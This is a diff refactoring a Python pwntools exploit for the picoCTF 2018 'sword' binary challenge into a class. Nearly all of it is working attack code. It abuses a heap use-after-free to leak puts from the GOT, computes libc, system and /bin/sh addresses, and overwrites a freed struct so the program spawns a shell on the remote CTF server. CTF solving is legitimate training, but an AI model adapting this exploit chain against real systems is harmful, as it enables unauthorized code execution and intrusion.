@@ -1,21 +1,134 @@
 #! /usr/bin/env python
-from binascii import unhexlify
-import os
-import sys
 #
 from pwn import context, p64, u64, log, process, remote, args
 from pwn import gdb, ELF
 context.clear(arch='amd64', os='linux')
 
 
-class ExploitInfo:
-    host = '2018shell2.picoctf.com'
-    port = 43469
-    name            = 'sword'
-    elf             = ELF(name)
-    libc_name       = 'libc.so.6'
-    LIBC            = ELF(libc_name)
-    gdb = r"""
+class Attack:
+    def __init__(self, host, port, elf_name, libc_name, gdb_script=None):
+        self.host, self.port = host, port
+        self.elf_name, self.libc_name = elf_name, libc_name
+        self.gdb_script = gdb_script
+
+        self.elf = ELF(self.elf_name)
+        self.libc = ELF(self.libc_name)
+
+        self.p = None
+
+
+    def get_process(self, ld_preload=False):
+        p = None
+        if args.REMOTE:
+            p = remote(self.host, self.port)
+        else:
+            env = {'LD_PRELOAD': './%s' % self.libc_name} if ld_preload else None
+            p = process('./%s' % self.elf_name, env=env)
+            if args.GDB:
+                gdb.attach(p.pid, self.gdb_script)
+        return p
+
+
+    def create_sword(self, ):
+        self.p.sendlineafter('Quit.\n', '1')
+        self.p.recvuntil('index is ')
+        idx = self.p.recv(1)
+        idx = int(idx)
+        return idx
+
+
+    def show_sword(self, index):
+        self.p.sendlineafter('Quit.\n', '3')
+        self.p.sendlineafter('?\n', str(index))
+        self.p.recvuntil('The name is ')
+        leak = self.p.recv(6)  # at least 6 byte address on amd64 system
+        leak = leak.ljust(8, '\x00')
+        leak = u64(leak)
+        return leak
+
+
+    def free_sword(self, index):
+        self.p.sendlineafter('Quit.\n', '4')
+        self.p.sendlineafter('?\n', str(index))
+
+
+    def harden_sword(self, index, length, sword_name, weight=-1):
+        self.p.sendlineafter('Quit.\n', '5')
+        self.p.sendlineafter('?\n', str(index))
+        self.p.sendlineafter('?\n', str(length))
+        self.p.sendlineafter('.\n', sword_name)
+        self.p.sendlineafter('?\n', str(weight))
+
+
+    def equip_sword(self, index):
+        self.p.sendlineafter('Quit.\n', '6')
+        self.p.sendlineafter('?\n', str(index))
+
+
+    def exploit(self):
+        elf = self.elf
+        libc = self.libc
+        libc.symbols['/bin/sh'] = 0x0018cd57
+
+        with self.get_process() as self.p:
+            # -- stage 1 ---------------------------------------------------------------
+
+            idx = self.create_sword()
+
+            # pretending printf, but got null in its address
+            payload  = 'A' * 8
+            payload += p64(elf.got['puts'])
+            BUF_LEN  = 256
+            payload += 'A' * (BUF_LEN - 1 - len(payload))
+
+            assert('\n' not in payload)
+            self.harden_sword(idx, BUF_LEN, payload)
+            self.free_sword(idx)
+
+            idx1 = self.create_sword()
+            idx2 = self.create_sword()
+
+            ADDR_puts = self.show_sword(idx2)
+            libc.address = ADDR_puts - libc.symbols['puts']
+            ADDR_bin_sh = libc.symbols['/bin/sh']
+            ADDR_system = libc.symbols['system']
+            log.info("puts @ plt : %s", hex(ADDR_puts))
+            log.info('libc       : %s', hex(libc.address))
+            log.info('bin_sh     : %s', hex(ADDR_bin_sh))
+            log.info('system     : %s', hex(ADDR_system))
+
+            self.harden_sword(idx2, BUF_LEN, '')
+            self.harden_sword(idx1, BUF_LEN, '')
+
+            self.free_sword(idx2)
+            self.free_sword(idx1)
+
+            # -- stage 2 ---------------------------------------------------------------
+
+            idx3 = self.create_sword()
+
+            payload = 'A' * 8
+            payload += p64(ADDR_bin_sh)
+            payload += p64(ADDR_system)
+            payload += 'A' * (BUF_LEN - 1 - len(payload))
+            assert('\n' not in payload)
+            self.harden_sword(idx3, BUF_LEN, payload)
+            self.free_sword(idx3)
+
+            idx4 = self.create_sword()
+            idx5 = self.create_sword()
+
+            self.equip_sword(idx5)
+
+            self.p.clean()
+            self.p.sendline('ls -la')
+            self.p.interactive()
+
+
+if __name__ == "__main__":
+    host, port = '2018shell2.picoctf.com', 43469
+    elf_name, libc_name = 'sword', 'libc.so.6'
+    gdb_script = r"""
 b 95
 b 177
 c
@@ -31,117 +144,5 @@ x/s $sword1->sword_name
 
 c
 """
-
-
-def get_process():
-    p = None
-    if args.REMOTE:
-        p = remote(ExploitInfo.host, ExploitInfo.port)
-    else:
-        p = process('./%s' % ExploitInfo.name)
-        if args.GDB:
-            gdb.attach(p.pid, ExploitInfo.gdb)
-    return p
-
-
-def create_sword(p):
-    p.sendlineafter('Quit.\n', '1')
-    p.recvuntil('index is ')
-    idx = p.recv(1)
-    idx = int(idx)
-    return idx
-
-
-def show_sword(p, index):
-    p.sendlineafter('Quit.\n', '3')
-    p.sendlineafter('?\n', str(index))
-    p.recvuntil('The name is ')
-    leak = p.recv(6)  # at least 6 byte address on amd64 system
-    leak = leak.ljust(8, '\x00')
-    leak = u64(leak)
-    return leak
-
-
-def free_sword(p, index):
-    p.sendlineafter('Quit.\n', '4')
-    p.sendlineafter('?\n', str(index))
-
-
-def harden_sword(p, index, length, sword_name, weight=-1):
-    p.sendlineafter('Quit.\n', '5')
-    p.sendlineafter('?\n', str(index))
-    p.sendlineafter('?\n', str(length))
-    p.sendlineafter('.\n', sword_name)
-    p.sendlineafter('?\n', str(weight))
-
-
-def equip_sword(p, index):
-    p.sendlineafter('Quit.\n', '6')
-    p.sendlineafter('?\n', str(index))
-
-
-def main():
-    elf = ExploitInfo.elf
-    libc = ExploitInfo.LIBC
-    OFFSET_bin_sh = 0x0018cd57
-
-    with get_process() as p:
-        # -- stage 1 ---------------------------------------------------------------
-
-        idx = create_sword(p)
-
-        # pretending printf, but got null in its address
-        payload  = 'A' * 8
-        payload += p64(elf.got['puts'])
-        BUF_LEN  = 256
-        payload += 'A' * (BUF_LEN - 1 - len(payload))
-        #assert('\x00' not in payload)
-        assert('\n' not in payload)
-
-        harden_sword(p, idx, BUF_LEN, payload)
-        free_sword(p, idx)
-
-        idx1 = create_sword(p)
-        idx2 = create_sword(p)
-
-        ADDR_puts = show_sword(p, idx2)
-        libc.address = ADDR_puts - libc.symbols['puts']
-        ADDR_bin_sh = libc.address + OFFSET_bin_sh
-        ADDR_system = libc.symbols['system']
-        log.info("puts @ plt    : 0x%08x", ADDR_puts)
-        log.info('libc          : 0x%08x' % (libc.address))
-        log.info('bin_sh        : 0x%08x' % (ADDR_bin_sh))
-        log.info('system        : 0x%08x' % (ADDR_system))
-
-        harden_sword(p, idx2, BUF_LEN, '')
-        harden_sword(p, idx1, BUF_LEN, '')
-
-        free_sword(p, idx2)
-        free_sword(p, idx1)
-
-        # -- stage 2 ---------------------------------------------------------------
-
-        idx3 = create_sword(p)
-
-        payload = 'A' * 8
-        payload += p64(ADDR_bin_sh)
-        payload += p64(ADDR_system)
-        payload += 'A' * (BUF_LEN - 1 - len(payload))
-        assert('\n' not in payload)
-        harden_sword(p, idx3, BUF_LEN, payload)
-        free_sword(p, idx3)
-
-        idx4 = create_sword(p)
-        idx5 = create_sword(p)
-
-        equip_sword(p, idx5)
-
-        p.clean()
-        p.sendline('ls -la')
-        p.interactive()
-
-        # -- stage 3 ---------------------------------------------------------------
-
-
-if __name__ == "__main__":
-    main()
+    attack = Attack(host, port , elf_name, libc_name, gdb_script)
+    attack.exploit()
